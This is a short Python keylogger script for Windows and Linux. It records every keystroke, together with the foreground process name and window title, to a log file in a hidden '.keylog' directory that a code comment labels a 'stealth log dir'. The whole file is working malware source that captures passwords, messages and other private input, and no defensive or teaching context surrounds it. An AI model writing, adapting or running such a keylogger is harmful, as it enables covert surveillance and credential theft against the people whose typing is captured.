from pynput import keyboard
import logging, os, platform, subprocess, psutil
from datetime import datetime

# --- stealth log dir ---
log_dir = os.path.join(os.getenv("APPDATA") if platform.system() == "Windows" else os.path.expanduser("~"), ".keylog")
os.makedirs(log_dir, exist_ok=True)
logging.basicConfig(filename=os.path.join(log_dir, "k.log"), level=logging.INFO, format="%(asctime)s|%(message)s", datefmt="%H:%M:%S")

# --- window grabber ---
def win():
    sys = platform.system()
    if sys == "Windows":
        try:
            import win32gui, win32process
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            p = psutil.Process(pid)
            return f"{p.name()}|{win32gui.GetWindowText(hwnd)}"
        except: return "?"
    elif sys == "Linux":
        try:
            wid = subprocess.check_output(["xprop","-root","_NET_ACTIVE_WINDOW"]).decode().split()[-1]
            name = subprocess.check_output(["xprop","-id",wid,"WM_NAME"]).decode().split("=",1)[1].strip().strip('"')
            pid = int(subprocess.check_output(["xprop","-id",wid,"_NET_WM_PID"]).decode().split()[-1])
            return f"{psutil.Process(pid).name()}|{name}"
        except: return "?"
    return "?"

# --- key handler ---
def press(k):
    try: c = k.char
    except: c = f"[{k.name}]"
    logging.info(f"{c}|{win()}")

def release(k):
    if k == keyboard.Key.esc: return False

# --- go ---
with keyboard.Listener(on_press=press, on_release=release) as l:
    l.join()
